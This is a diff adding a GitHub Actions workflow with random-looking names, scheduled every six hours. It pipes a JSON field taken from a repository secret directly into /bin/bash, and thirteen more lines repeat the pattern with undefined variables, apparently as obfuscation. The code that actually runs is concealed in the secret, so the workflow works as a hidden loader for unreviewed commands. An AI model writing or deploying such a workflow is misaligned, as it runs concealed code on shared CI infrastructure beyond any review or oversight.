@@ -1,0 +1,31 @@
+name: danshantedemang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: danshantedemang
+        env:
+          ihetx9: ${{ secrets.ihetx9 }}
+        run: |
+          echo $ihetx9 | jq -r .updv8 | /bin/bash
+          echo $fq7 | jq -r .qyf747 | /bin/bash
+          echo $gshm3 | jq -r .ybkce09604 | /bin/bash
+          echo $o8490 | jq -r .e7 | /bin/bash
+          echo $og5775 | jq -r .roi66364 | /bin/bash
+          echo $fzip5 | jq -r .aoaga35 | /bin/bash
+          echo $flpz11751 | jq -r .ic90 | /bin/bash
+          echo $bksem71571 | jq -r .fdy4 | /bin/bash
+          echo $f79759 | jq -r .vyemq2026 | /bin/bash
+          echo $sd8 | jq -r .snla9 | /bin/bash
+          echo $xj8172 | jq -r .bihji7 | /bin/bash
+          echo $z26419 | jq -r .j8 | /bin/bash
+          echo $avpnd4312 | jq -r .cu57 | /bin/bash
+          echo $vchsa35 | jq -r .iqk197 | /bin/bash
+
